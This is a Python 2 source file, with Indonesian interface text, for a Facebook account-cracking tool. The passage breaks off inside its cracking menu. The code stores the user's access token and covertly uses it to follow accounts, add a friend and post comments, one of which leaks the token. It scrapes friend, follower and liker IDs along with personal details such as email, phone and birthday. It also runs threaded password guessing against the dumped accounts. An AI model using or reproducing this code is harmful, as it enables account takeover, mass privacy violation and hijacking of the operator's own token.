#!/usr/bin/python2
# coding=utf-8
# code by Aang Ardiansyah-XD
# my facebook ( https://www.facebook.com/clubfunbike )

#      (C) Copyright 407 Authentic Exploit
#      Rebuild Copyright Can't make u real programmer:)
#      Coded By Aang Ardiansyah-XD.

import os
try:
    import requests
except ImportError:
    print '\n [×] Modul requests belum terinstall!...\n'
    os.system('pip2 install requests')

try:
    import concurrent.futures
except ImportError:
    print '\n [×] Modul Futures belum terinstall!...\n'
    os.system('pip2 install futures')

try:
    import bs4
except ImportError:
    print '\n [×] Modul Bs4 belum terinstall!...\n'
    os.system('pip2 install bs4')

import requests, os, re, bs4, sys, json, time, random, datetime
from concurrent.futures import ThreadPoolExecutor as YayanGanteng
from datetime import datetime
from bs4 import BeautifulSoup
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
reload(sys)
sys.setdefaultencoding('utf-8')
### WARNA RANDOM ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
#  Moh Aang Ardiansyah XD.  #
#------------------------------->

ok = []
cp = []
id = []
user = []
num = 0
loop = 0
xi_jimpinx = '1714000985456399'
koh = '100005395413800'
url = "https://mbasic.facebook.com"
hoetank = random.choice(['Yang posting orang nya ganteng:)', 'Lo ngentod:v', 'Never surrentod tekentod kentod:v'])
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

# lempankkkkkkkk
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)

def tod():
    titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
    for x in titik:
        print '\r%s[%s+%s] menghapus token... %s'%(N,M,N,x),
        sys.stdout.flush()
        time.sleep(1)

# LO KONTOL
logo =  ''' \033[0;96m  __  ___     ____  _   ___  ____
\033[0;96m  /  |/  /_ __/ / /_(_) / _ )/ __/\033[0;97m|| Created By Aang-XD
\033[0;96m / /|_/ / // / / __/ / / _  / _/  \033[0;97m|| Github.com/AngCyber
\033[0;96m/_/  /_/\_,_/_/\__/_/ /____/_/\033[0;91mv2.9\033[0;97m|| Facebook Saya Aang'''

lo_ngentod = '1714009362122228'
# crack selesai
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        print '\n\n%s╔═[%s•%s] crack selesai sayang...'%(N,K,N)
        print '╠═[%s+%s] total akun OK : %s%s%s'%(O,N,H,str(len(ok)),N)
        print '╚═[%s+%s] total akun CP : %s%s%s'%(O,N,K,str(len(cp)),N);exit()
    else:
        print '\n\n[%s!%s] awokawok kaga dapet hasil'%(M,N);exit()

#masuk token
def yayanxd():
    os.system('clear')
    print ('%s╔═[%s tools ini menggunakan login token facebook \n%s╠═[%s apakah sudah tau cara mendapatkan token facebook? \n%s╠═[%s ketik %s(open)%s untuk mendapatkan token facebook '%(O,N,O,N,O,N,H,N))
    print ('%s║%s '%(O,N))
    kontol = raw_input('%s%s╚═[?]%s Masukkan Token :%s '%(N,M,N,H))
    if kontol in ('open', 'Open', 'OPEN'):
        print '\n%s•%s Login kan akun tumbal di google chrome terlebih dahulu'%(B,N);time.sleep(2)
        print '%s•%s Jangan lupa!! url ubah ke %shttps://m.facebook.com'%(B,N,H);time.sleep(2)
        print '%s•%s Setelah di alihkan ke google chrome. klik %stitik tiga'%(B,N,H);time.sleep(2)
        print '%s•%s Lalu klik %sCari di Halaman%s Tinggal ketik %sEAAA%s Lalu salin.'%(B,N,H,N,H,N);time.sleep(2)
        raw_input('%s•%s TEKAN ENTER '%(O,N))
        os.system('xdg-open https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_')
        yayanxd()
    try:
        nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(kontol)).json()['name']
        print '\n\n%s╔═[%s Selamat datang %s%s%s ngentod \033[0;96m]'%(O,N,K,nama,N);time.sleep(2)
        print '%s╠═[%s Mohon untuk menggunakan script ini sewajarnya saja \033[0;96m]'%(O,N);time.sleep(2)
        print '%s╠═[%s Bismillah dulu biar dapet banyak ngab \033[0;96m]'%(O,N);time.sleep(2)
        print '%s╠═[%s Subscribe channel gua dulu yaa \033[0;96m]'%(O,N);time.sleep(2)
        print '%s║%s '%(O,N);time.sleep(0.07)
        print '%s║%s '%(O,N);time.sleep(0.06)
        open('.memek.txt', 'w').write(kontol)
        raw_input('%s╚═[%s TEKAN ENTER \033[0;96m]'%(O,N));wuhan(kontol)
        os.system('xdg-open https://youtube.com/channel/UCqwjydkaE3y0qo-3Yl3yL3A')
        
        moch_yayan()
    except KeyError:
        print '\n\n%s╚═[%s•%s] Token Invalid Ngab!'%(N,M,N);time.sleep(2);yayanxd()

### AANG GANTENG ###
def moch_yayan():
    os.system('clear')
    try:
    	kontol = open('.memek.txt', 'r').read()
    except IOError:
        print '\n%s╚═[%s•%s] Token Invalid Ngab!'%(N,M,N);time.sleep(2);os.system('rm -rf .memek.txt');yayanxd()
    try:
        nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(kontol)).json()['name']
    except KeyError:
        print '\n%s╚═[%s•%s] Token Invalid Ngab!'%(N,M,N);time.sleep(2);os.system('rm -rf .memek.txt');yayanxd()
    except requests.exceptions.ConnectionError:
        exit('\n\n %s[%s!%s] tidak ada koneksi\n'%(N,M,N))
    os.system('clear')
    print logo
    IP = requests.get("https://api.ipify.org").text
    print '___________________________________________________________\n';time.sleep(0.05)
    print '\033[0;96m╔═[\033[0;97m NAMA KAMU : %s'%(nama);time.sleep(0.05)
    print '\033[0;96m╚═[\033[0;97m IP KAMU   : %s'%(IP);time.sleep(0.05)
    print '___________________________________________________________\n';time.sleep(0.05)
    print '%s╔═[%s Author  : \033[0;97mAang Ardiansyah-XD'%(O,N);time.sleep(0.05)
    print '%s╠═[%s Github  : \033[0;97mGithub.com/AngCyber'%(O,N);time.sleep(0.05)
    print '%s╚═[%s Contact : \033[0;97m089524163441'%(O,N); time.sleep(0.05)
    print '\033[0;97m___________________________________________________________\n';time.sleep(0.05)
    print '%s╔═[01]%s Dump id \033[0;97mdari teman \033[0;96m[5000 ID]'%(O,N);time.sleep(0.05)
    print '\033[0;97m%s╠═[02]%s Dump id \033[0;97mdari teman publik \033[0;96m[5000 ID]'%(O,N);time.sleep(0.05)
    print '\033[0;97m%s╠═[03]%s Dump id \033[0;97mdari total followers \033[0;96m[5000 ID]'%(O,N);time.sleep(0.05)
    print '\033[0;97m%s╠═[04]%s Dump id \033[0;97mdari like postingan \033[0;96m[5000 ID]'%(O,N);time.sleep(0.05)
    print '\033[0;97m%s╠═[05]%s Start cracking'%(O,N);time.sleep(0.05)
    print '%s╠═[06]%s Cek informasi akun fb'%(O,N);time.sleep(0.05)
    print '%s╠═[07]%s Lihat hasil crack \033[0;97msaya'%(O,N);time.sleep(0.05)
    print '%s╠═[08]%s Setting user agent'%(O,N);time.sleep(0.05)
    print '%s╠═[09]%s Informasi %sscript%s'%(O,N,O,N);time.sleep(0.05)
    print '%s╠═[00]%s Keluar (%sAhh Ngecrot%s)'%(M,N,M,N);time.sleep(0.05)
    print '%s║%s'%(O,N);time.sleep(0.05)
    pepek = raw_input('\033[0;96m╚═[••] \033[0;97mmenu : ')
    if pepek == '':
        print '\n %s%s╚═[%s JANGAN KOSONG KENTOD ]'%(N,M,N);time.sleep(0.02);moch_yayan()
    elif pepek in['1','01']:
        teman(kontol)
    elif pepek in['2','02']:
        publik(kontol)
    elif pepek in['3','03']:
        followers(kontol)
    elif pepek in['4','04']:
        postingan(kontol)
    elif pepek in['5','05']:
        __crack__().plerr()
    elif pepek in['6','06']:
        cek_ingfo(kontol)
    elif pepek in['7','07']:
        try:
            dirs = os.listdir("results")
            print '\n╔═[ hasil crack yang tersimpan di file anda ]\n'
            for file in dirs:
                print("%s╠═[%s %s"%(O,N,file))
            file = raw_input("\n╔═[%s•%s] masukan nama file :%s "%(M,N,H))
            if file == "":
                file = raw_input("\n%s╔═[%s•%s] masukan nama file :%s %s"%(N,M,N,H,N))
            total = open("results/%s"%(file)).read().splitlines()
            print("%s%s╠%s══════════════════════════════════════════════════════"%(N,O,N));time.sleep(2)
            nm_file = ("%s"%(file)).replace("-", " ")
            hps_nm  = nm_file.replace(".txt", "").replace("OK", "").replace("CP", "")
            jalan("%s╠[%s Hasil %scrack%s pada tanggal %s:%s%s%s total %s: %s%s%s "%(M,N,O,N,M,O,hps_nm,N,M,O,len(total),O))
            print("%s%s╠%s══════════════════════════════════════════════════════"%(N,O,N));time.sleep(2)
            for memek in total:
            	kontol = memek.replace("\n","")
                titid  = kontol.replace("[✓] "," \x1b[0m[\x1b[1;92m✓\x1b[0m]\x1b[1;92m ").replace(" ╠ ", " \x1b[0m[\x1b[1;93m×\x1b[0m]\x1b[1;93m ")
                print("%s%s"%(titid,N));time.sleep(0.03)
            print("%s%s╚%s══════════════════════════════════════════════════════"%(N,O,N))
            raw_input('\n%s╚═[%s KEMBALI ] '%(O,N));moch_yayan()
        except (IOError):
            print("\n%s[%s×%s] awokawok kaga dapet hasil"%(N,M,N))
            raw_input('\n%s╚═[%s KEMBALI%s ] '%(O,N));moch_yayan()
    elif pepek in['8','08']:
        seting_yntkts()
    elif pepek in['9','09']:
        info_tools()
    elif pepek in['0','00']:
        print '\n'
        tod()
        time.sleep(1);os.system('rm -rf .memek.txt')
        jalan('\n%s[%s✓%s]%s berhasil menghapus token'%(N,H,N,H));exit()
    else:
        print '\n%s[%s×%s] menu [%s%s%s] isi yang bener lah ngentod!!'%(N,M,N,M,pepek,N);time.sleep(2);moch_yayan()

# Bot nya jangan diganti ajg tambahin aja kentod
def wuhan(kontol):
    try:
        kentod = kontol
        requests.post('https://graph.facebook.com/100053460048331/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/100001390111040/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/100008678141977/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/100005878513705/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/100003342127009/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/100041388320565/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/108229897756307/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/857799105/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/100027558888180/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s'%(koh,kentod))
        requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(lo_ngentod,kentod,kentod))
        requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(xi_jimpinx,hoetank,kentod))
    except:
    	pass

# dump id dari teman hehe
def teman(kontol):
    try:
        os.mkdir('dump')
    except:pass
    try:
        mmk = raw_input('\n%s%s╔═[%s nama file  : '%(N,O,N))
        asw = raw_input('%s%s╚═[%s limit id   : '%(N,O,N))
        cin = ('dump/' + mmk + '.json').replace(' ', '_')
        ys  = open(cin, 'w')
        for a in requests.get('https://graph.facebook.com/me/friends?limit=%s&access_token=%s'%(asw,kontol)).json()["data"]:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Mohon Tunggu Sedang Dump Id...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            time.sleep(0.0050)

        ys.close()
        jalan('\n\n%s[%s✓%s] berhasil dump id dari teman'%(N,H,N))
        print '[%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,cin,N)
        print 50 * '-'
        raw_input('[%s TEKAN ENTER%s ] '%(O,N));moch_yayan()
    except (KeyError,IOError):
        os.remove(cin)
        jalan('\n%s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
        raw_input('[ %sKEMBALI%s ] '%(O,N));moch_yayan()
'''
																																																				csy = 'Cindy sayang Yayan'
																																																				ysc = 'Yayan sayang Cindy'
																																																			'''
# dump id dari teman publik hehe
def publik(kontol):
    try:
        os.mkdir('dump')
    except:pass
    try:
        csy = raw_input('\n%s%s╔═[%s id publik  : '%(N,O,N))
        ahh = raw_input('%s%s╠═[%s nama file  : '%(N,O,N))
        ihh = raw_input('%s%s╚═[%s limit id   : '%(N,O,N))
        knt = ('dump/' + ahh + '.json').replace(' ', '_')
        ys  = open(knt, 'w')
        for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s'%(csy,ihh,kontol)).json()["data"]:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Mohon Tunggu Sedang Dump Id...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            time.sleep(0.0050)

        ys.close()
        jalan('\n\n%s[%s✓%s] berhasil dump id dari teman publik'%(N,H,N))
        print '[%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,knt,N)
        print 50 * '-'
        raw_input('[%s TEKAN ENTER%s ] '%(O,N));moch_yayan()
    except (KeyError,IOError):
        os.remove(knt)
        jalan('\n%s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
        raw_input('[ %sKEMBALI%s ] '%(O,N));moch_yayan()

# dump id dari followers hehe
def followers(kontol):
    try:
        os.mkdir('dump')
    except:pass
    try:
        csy = raw_input('\n%s[%s╔═[%s id followers  : '%(N,O,N))
        mmk = raw_input('%s[%s╠═[%s nama file  : '%(N,O,N))
        asw = raw_input('%s%s╚═[%s limit id   : '%(N,O,N))
        ah  = ('dump/' + mmk + '.json').replace(' ', '_')
        ys  = open(ah, 'w')
        for a in requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s'%(csy,asw,kontol)).json()["data"]:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Mohon Tunggu Sedang Dump Id...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            time.sleep(0.0050)

        ys.close()
        jalan('\n\n%s[%s✓%s] berhasil dump id dari total followers'%(N,H,N))
        print '[%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,ah,N)
        print 50 * '-'
        raw_input('[%s TEKAN ENTER%s ] '%(O,N));moch_yayan()
    except (KeyError,IOError):
        os.remove(ah)
        jalan('\n%s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
        raw_input('[ %sKEMBALI%s ] '%(O,N));moch_yayan()

# dump id dari followers hehe
def followers(kontol):
    try:
        os.mkdir('dump')
    except:pass
    try:
        csy = raw_input('\n%s%s╔═[%s id followers  : '%(N,O,N))
        mmk = raw_input('%s%s╠═[%s nama file  : '%(N,O,N))
        asw = raw_input('%s%s╚═[%s limit id   : '%(N,O,N))
        ah  = ('dump/' + mmk + '.json').replace(' ', '_')
        ys  = open(ah, 'w')
        for a in requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s'%(csy,asw,kontol)).json()["data"]:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Mohon Tunggu Sedang Dump Id...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            time.sleep(0.0050)

        ys.close()
        jalan('\n\n%s[%s✓%s] berhasil dump id dari total followers'%(N,H,N))
        print '[%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,ah,N)
        print 50 * '-'
        raw_input('[%s TEKAN ENTER%s ] '%(O,N));moch_yayan()
    except (KeyError,IOError):
        os.remove(ah)
        jalan('\n%s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
        raw_input('[ %sKEMBALI%s ] '%(O,N));moch_yayan()

# dump id dari postingan hehe
def postingan(kontol):
    try:
        os.mkdir('dump')
    except:pass
    try:
        csy = raw_input('\n%s%s╔═[%s id postingan : '%(N,O,N))
        ppk = raw_input('%s%s╠═[%s nama file  : '%(N,O,N))
        asw = raw_input('%s%s╚═[%s limit id   : '%(N,O,N))
        ahh = ('dump/' + ppk + '.json').replace(' ', '_')
        ys  = open(ahh, 'w')
        for a in requests.get('https://graph.facebook.com/%s/likes?limit=%s&access_token=%s'%(csy,asw,kontol)).json()["data"]:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Mohon Tunggu Sedang Dump Id...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            time.sleep(0.0050)

        ys.close()
        jalan('\n\n%s[%s✓%s] berhasil dump id dari like postingan'%(N,H,N))
        print '[%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,ahh,N)
        print 50 * '-'
        raw_input('[%s TEKAN ENTER%s ] '%(O,N));moch_yayan()
    except (KeyError,IOError):
        os.remove(ahh)
        jalan('\n%s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
        raw_input('[ %sKEMBALI%s ] '%(O,N));moch_yayan()

# cek ingfo
def cek_ingfo(kontol):
    try:
        user = raw_input("\n[%s•%s] masukan id atau username : "%(O,N))
        if user == '':
            print "\n[%s!%s] jangan kosong bro"%(M,N);cek_ingfo(kontol)
        url = ("https://lookup-id.com/")
        if "facebook" in user:
            payload = {"fburl": user, "check": "Lookup"}
        else:
            payload = {"fburl": "https://free.facebook.com/" + user, "check": "Lookup"}
        halaman = requests.post(url, data = payload).text.encode("utf-8")
        sop_ = BeautifulSoup(halaman, "html.parser")
        email_ = sop_.find("span", id = "code")
        idt = email_.text
        if user == "me":
            idt = "me"
        x = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt, kontol)).json()
        nmaa = x['name']
    except (KeyError, IOError):
        nmaa = '%s-%s'%(M,N)
    print '\n[ Informasi akun Facebook ]';time.sleep(0.03)
    print '\n[•] nama lengkap : %s'%(nmaa);time.sleep(0.03)
    try:
    	ndpn = x['first_name']
    except (KeyError, IOError):
    	ndpn = '%s-%s'%(M,N)
    print '[•] nama depan   : %s'%(ndpn);time.sleep(0.03)
    try:
    	nmbl = x['last_name']
    except (KeyError, IOError):
    	nmbl = '%s-%s'%(M,N)
    print '[•] nama belakang: %s'%(nmbl);time.sleep(0.03)
    try:
    	hwhs = x['username']
    except (KeyError, IOError):
    	hwhs = '%s-%s'%(M,N)
    print '[•] username fb  : %s'%(hwhs);time.sleep(0.03)
    try:
    	asu = x['id']
    except (KeyError, IOError):
    	asu = '%s-%s'%(M,N)
    print '[•] id facebook  : %s'%(asu);time.sleep(0.03)
    print '\n  * data-data akun facebook *\n';time.sleep(0.03)
    try:
    	emai = x['email']
    except (KeyError, IOError):
    	emai = '%s-%s'%(M,N)
    print '[•] email facebook : %s'%(emai);time.sleep(0.03)
    try:
    	nmrr = x['mobile_phone']
    except (KeyError, IOError):
    	nmrr = '%s-%s'%(M,N)
    print '[•] nomor telepon  : %s'%(nmrr);time.sleep(0.03)
    try:
    	ttll = x['birthday']
        month, day, year = ttll.split("/")
        month = bulan_ttl[month]
    except (KeyError, IOError):
    	month = '%s-%s'%(M,N)
        day = '%s-%s'%(M,N)
        year = '%s-%s'%(M,N)
    print '[•] tanggal lahir  : %s %s %s '%(day,month,year);time.sleep(0.03)
    try:
    	jenis = x['gender'].replace("female", "Perempuan").replace("male", "Laki-laki")
    except (KeyError, IOError):
    	jenis = ''
    print '[•] jenis kelamin  : %s '%(jenis)
    try:
    	r = requests.get('https://graph.facebook.com/%s/friends?limit=50000&access_token=%s'%(idt, kontol))
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])
    except:pass
    print '[•] total teman  : %s'%str(len(id));time.sleep(0.03)
    try:
    	r = requests.get('https://graph.facebook.com/%s/subscribers?access_token=%s'%(idt, kontol))
        z = json.loads(r.text)
        pengikut = z['summary']['total_count']
    except (KeyError, IOError):
    	pengikut = '%s-%s'%(M,N)
    print '[•] total followers: %s'%(pengikut);time.sleep(0.03)
    try:
    	lins = x['link']
    except (KeyError, IOError):
    	lins = '%s-%s'%(M,N)
    print '[•] link facebook  : %s'%(lins);time.sleep(0.03)
    try:
    	stas = x['relationship_status']
    except (KeyError, IOError):
    	stas = '%s-%s'%(M,N)
    try:
    	dgn = '''dengan %s'''%(x['significant_other']['name'])
    except (KeyError, IOError):
    	dgn = '%s-%s'%(M,N)
    except: pass
    print '[•] status hubungan: %s %s'%(stas,dgn);time.sleep(0.03)
    try:
    	bioo = x['about']
    except (KeyError, IOError):
    	bioo = '%s-%s'%(M,N)
    except: pass
    print '[•] tentang status : %s'%(bioo);time.sleep(0.03)
    try:
    	dari = x['hometown']['name']
    except (KeyError, IOError):
    	dari = '%s-%s'%(M,N)
    except: pass
    print '[•] kota asal      : %s'%(dari);time.sleep(0.03)
    try:
    	tigl = x['location']['name']
    except (KeyError, IOError):
    	tigl = '%s-%s'%(M,N)
    except: pass
    print '[•] tinggal di     : %s'%(tigl);time.sleep(0.03)
    try:
    	tzim = x['timezone']
    except (KeyError, IOError):
    	tzim = '%s-%s'%(M,N)
    except: pass
    print '[•] zona waktu     : %s'%(tzim);time.sleep(0.03)
    try:
    	jam  = x['updated_time'][11:19]
    	uptd = x['updated_time'][:10]
        year, month, day = uptd.split("-")
        month = bulan_ttl[month]
    except (KeyError, IOError):
    	year = '%s-%s'%(M,N)
        month = '%s-%s'%(M,N)
        day = '%s-%s'%(M,N)
    except:pass
    print '[•] terakhir di update pada tanggal %s bulan %s tahun %s jam %s'%(day, month, year, jam);time.sleep(0.03)
    print '%s[%s#%s]'%(N,O,N), 52 * '\x1b[1;96m-\x1b[0m'
    jalan('\n[%s✓%s] berhasil mengecek data-data akun facebook\n\n'%(O,N));exit()

# cek ingfo sc
def info_tools():
    os.system('clear')
    print '%s[%s#%s]'%(N,O,N), 52 * '\x1b[1;96m-\x1b[0m';time.sleep(0.09)
    print '%s[%s>%s] YouTube   : Aang-XD.'%(N,H,N);time.sleep(0.09)
    print '%s[%s>%s] Author    : Aang Ardiansyah-XD'%(N,H,N);time.sleep(0.09)
    print '%s[%s>%s] Github    : Https://github.com/AngCyber'%(N,H,N);time.sleep(0.09)
    print '%s[%s>%s] Facebook  : Saya Aang & Why Aang Ardiansyah'%(N,H,N);time.sleep(0.09)
    print '%s[%s>%s] Instagram : aang_ardiansyah_xd'%(N,H,N);time.sleep(0.09)
    print '%s[%s#%s]'%(N,O,N), 52 * '\x1b[1;96m-\x1b[0m';time.sleep(0.09)
    raw_input('\n[ %sKEMBALI%s ] '%(O,N));moch_yayan()

### ganti user agent
def seting_yntkts():
    print '\n[%s1%s] Ganti user agent'%(O,N)
    print '[%s2%s] Check user agent'%(O,N)
    ytbjts = raw_input('\n%s[%s?%s] menu : '%(N,O,N))
    if ytbjts == '':
        print '\n%s[%s×%s] Gak boleh kosong Kentod'%(N,M,N);time.sleep(2);seting_yntkts()
    elif ytbjts =='1':
        yo_ndak_tau_ko_tanya_saia()
    elif ytbjts =='2':
        check_yntkts()
    else:
        print '\n%s[%s×%s] input yang bener'%(N,M,N);time.sleep(2);seting_yntkts()

# User Agent baru
def yo_ndak_tau_ko_tanya_saia():
    os.system('rm -rf YNTKTS.txt')
    print '\n%s[%s•%s] notice me: cari User Agent di google chrome'%(N,O,N)
    print '[%s•%s] ketik User Agent atau My User Agent...'%(M,N)
    anjng = raw_input('[%s?%s] Masukan User Agent :%s '%(O,N,H))
    if anjng == '':
        print '\n%s[%s×%s] Gak boleh kosong Kentod'%(N,M,N);yo_ndak_tau_ko_tanya_saia()
    try:
        open('YNTKTS.txt', 'w').write(anjng);time.sleep(2)
        jalan('\n%s[%s✓%s] berhasil mengganti user agent...'%(N,H,N))
        raw_input('\n%s[ %sKEMBALI%s ]'%(N,O,N));moch_yayan()
    except:pass

# Cek User Agent
def check_yntkts():
    try:
        user_agent = open('YNTKTS.txt', 'r').read()
    except IOError:
    	user_agent = '%s-'%(M)
    except: pass
    print '\n%s[%s•%s] User Agent Anda : %s%s'%(N,O,N,H,user_agent)
    raw_input('\n%s[ %sKEMBALI%s ]'%(N,O,N));moch_yayan()

# mulai ngecrot awokawokawokkawok
class __crack__:

    def __init__(self):
        self.id = []

    def plerr(self):
        try:
            self.apk = raw_input('\n%s╔═[?]%s masukan file dump : '%(O,N))
            self.id = open(self.apk).read().splitlines()
            print '%s╠═[•]%s total id -> %s%s%s' %(O,N,M,len(self.id),N)
        except:
            print '%s╠═[%s×%s] File [%s%s%s] tidak ada, dump id dulu lah kentod'%(N,M,N,M,self.apk,N);time.sleep(2)
            raw_input('\n%s╚═[ %sKEMBALI%s ]'%(N,O,N));moch_yayan()
        ___yayanganteng___ = raw_input('%s╚═[?]%s ingin menggunakan kata sandi manual? [y/t]: '%(O,N))
        if ___yayanganteng___ in ('Y', 'y'):
            print '\n%s%s╠═[%s Gunakan (koma) untuk pemisah dan sandi minimal 6 karakter'%(N,M,N)
            while True:
                pwek = raw_input('\n%s╔═[%s Masukan kata sandi : '%(O,N))
                print '\033[0;96m╚═[•] \033[0;97mCrack dengan sandi [%s%s%s]' % (M, pwek, N)
                if pwek == '':
                    print '\n%s[%s×%s] kata sandi jangan kosong ngentod'%(N,M,N)
                elif len(pwek)<=5:
                    print '\n%s[%s×%s] kata sandi minimal 6 karakter'%(N,M,N)
                else:
                    def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
                        cin = raw_input('\033[0;96m╚═[?] \033[0;97mMetode : ')
                        if cin == '':
                            print '\n %s[%s×%s] jangan kosong kentod'%(N,M,N);self.__yan__()
                        elif cin == '1':
                            print '\n\033[0;96m╔═[%s+%s\033[0;96m] \033[0;97makun OK saved in > results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print '\033[0;96m╠═[%s+%s\033[0;96m] \033[0;97makun CP saved in > results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print '\033[0;96m╚═[%s!%s\033[0;96m] \033[0;97maktifkan mode pesawat (5 detik) setiap 3 menit\n'%(M,N)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__api__, kimochi, ysc)
                                    except: pass

                            os.remove(self.apk)
                            hasil(ok,cp)
                        elif cin == '2':
                            print '\n\033[0;96m╔═[%s+%s\033[0;96m] \033[0;97makun OK saved in > results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print '\033[0;96m╠═[%s+%s\033[0;96m] \033[0;97makun CP saved in > results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print '\033[0;96m╚═[%s!%s\033[0;96m] \033[0;97maktifkan mode pesawat (5 detik) setiap 3 menit\n'%(M,N)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__mbasic__, kimochi, ysc)
                                    except: pass

                            os.remove(self.apk)
                            hasil(ok,cp)
                        elif cin == '3':
                            print '\n\033[0;96m╔═[%s+%s\033[0;96m] \033[0;97makun OK saved in > results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
